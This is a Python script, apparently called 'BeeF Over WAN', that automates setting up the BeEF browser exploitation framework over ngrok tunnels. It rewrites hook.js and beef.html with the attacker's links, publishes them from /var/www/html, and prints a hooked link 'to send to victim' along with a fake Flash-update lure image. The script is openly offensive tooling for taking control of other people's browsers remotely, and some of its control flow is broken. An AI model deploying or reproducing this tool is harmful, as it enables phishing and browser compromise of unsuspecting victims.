#!/usr/bin/python
# -*- coding: utf8 -*-

import random 
import string
import argparse
import os
from termcolor import colored
Filename="hook.js"

def instruction():
	return """
Instructions :\n
You need two Links  which are Forwarded To LocalHost:80 and LocalHost:3000\n
\t1. To send to Victim .
\t2. Beef listens on Port 3000 ,\n\t   so this link should be forwared to LocalHost:3000 .
	
Just Enter your links in the Script \nScript will do neccessary changes required to opt for your Links .

"""

def ngrok():
	return """	
NGROK Steps :-

STEP 1 : Add these Lines To ngrok.yml [Location .ngrok2/ngrok.yml ]
	
	tunnels:
  	first-app:
    	addr: 80
    	proto: http
  	second-app:
    	addr: 3000
    	proto: http
	
STEP 2 : Now Start ngrok with : \n
		ngrok start --all

STEP 3 : You will See 2 different links Forwarded to\n 
	Localhost:80              [ Link To be Sent to Victim ]\n
        Localhost:3000		  [ Your Link will be Connecting to.. ] 	
						
STEP 4 : Enter these links in Script and Follow The Steps given in Script.

"""

def banner():
	return """
  ____            ______    ____                  __          __     _   _ 
 |  _ \          |  ____|  / __ \                 \ \        / /\   | \ | |
 | |_) | ___  ___| |__    | |  | |_   _____ _ __   \ \  /\  / /  \  |  \| |
 |  _ < / _ \/ _ \  __|   | |  | \ \ / / _ \ '__|   \ \/  \/ / /\ \ | . ` |
 | |_) |  __/  __/ |      | |__| |\ V /  __/ |       \  /\  / ____ \| |\  |
 |____/ \___|\___|_|       \____/  \_/ \___|_|        \/  \/_/    \_\_| \_|
                                                                           
 BY SKS  \n\n https://github.com/stormshadow07                                                                                                                          """
def color(string, color=None):
    attr = []
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string
def string_replace(filename, old_string, new_string):
    # Safely read the input filename using 'with'
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print '"{old_string}" not found in {filename}.'.format(**locals())
            return

    # Safely write the changed content, if found in the file
    with open(filename, 'w') as f:
        #print 'Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals())
        s = s.replace(old_string, new_string)
        f.write(s)
    print(color('[✔] File Changed...','green'))




if __name__ == '__main__':
    os.system("clear")
    
    
    print (color(instruction(),"green"))
    print (color("[*] IF you want to Do this Without Port Forwarding : Use NGROK\n"))
    ng_check=input(color("[?] Press '1' to see NGROK Instructions else Press '0' : "))
    print(ng_check)
    if (ng_check):
        print (color(ngrok(),"green"))
        con=input(color("[?] Press Enter to Continue ..."))
        os.system("clear")	
        print(color(" Checking Services Status Required ","blue"))
        os.system("service apache2 start")
        os.system("beef-xss")
        os.system("clear")
        print(color("All Good So far ... \n Close The Browser If Prompted .. ","green"))
        print(color(banner(),"green"))
        send_to=input(color((' [?] Enter Adress of Link [You are Sending to Victim]: ')))
        send_to=send_to.rstrip()
        print(color((" [+] Send_To Link  : "+ send_to)))
        connect_to=input(color((' [?] Enter Adress of Link [Your Link will be Connecting to..]: ')))
        connect_to=connect_to.rstrip()
        print(color((" [+] Connect_To Link  : "+ connect_to)))
        print (color('[✔] Checking directories...','green'))
    if not os.path.isdir("./temp"):
        os.makedirs("./temp")
        print (color("[+] Creating [./temp] directory for resulting code files","green"))
    else:
        os.system("rm -rf temp/*")
        print(color("Clean Succesful","green"))
        connect_to_full='http://'+connect_to+":80/hook.js"
        connect_to_panel='http://'+connect_to+"/ui/panel"
        send_to_full='http://'+send_to+'/beef.html'
        #print connect_to_full
        os.system("cp base.js ./temp/hook.js")
        string_replace("./temp/hook.js","SKS_1",connect_to_full)
        string_replace("./temp/hook.js","SKS_2",connect_to)
        
        os.system("cp beef.html ./temp/beef.html")
        string_replace("./temp/beef.html","SKS_3",send_to)
        os.system("cp ./temp/* /var/www/html/")
        os.system("chmod a+rw /var/www/html/hook.js")
        
        print (color("\n==================================== RESULT ====================================\n","blue"))
        print (color("[+] Access The BeeF Control Panel Using : {}".format(connect_to_panel),"green"))
        print (color("\t Username = beef\n\t Password = beef\n","blue"))
        print (color("[+] Hooked Link To Send to Victim  : "+send_to_full,"green"))
        print (color ('[?]\n\nNote : I know few of the Exploits does not work\n       due to Updated Browsers and stuff...\n\nTip : Change Payload or Images Address to your Connect_to Address with Port 80 \n\t Example : \n\t\t'))
        print (color("\tFROM Image URL : http://0.0.0.0:3000/adobe/flash_update.png\n","red"))
        print( color("\tTO Image URL : http://{}:80/adobe/flash_update.png \n".format(connect_to),"green"))
        print (color ('\n Happy Hacking !!!\n Have Problem or Tip ? Contact : https://github.com/stormshadow07',"green"))



	
















